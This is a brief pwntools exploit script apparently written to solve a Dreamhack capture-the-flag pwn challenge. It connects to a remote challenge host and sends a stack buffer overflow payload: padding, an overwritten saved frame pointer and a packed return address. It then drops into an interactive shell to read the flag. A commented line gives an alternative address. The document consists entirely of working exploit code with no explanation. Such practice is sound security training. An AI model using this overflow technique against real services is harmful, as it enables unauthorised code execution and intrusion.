from pwn import *

r = remote(“host3.dreamhack.games”, 16936)

r.sendlineafter(‘Input:’, b’A’*0x30 + b’B’*0x8 + p64(0x4006aa))
#(write(b’A’*0x30 + b’B’*0x8 + b’\xa7\x05\x40\x00\x00\x00\x00\x00’))

r.interactive()

#cat flag
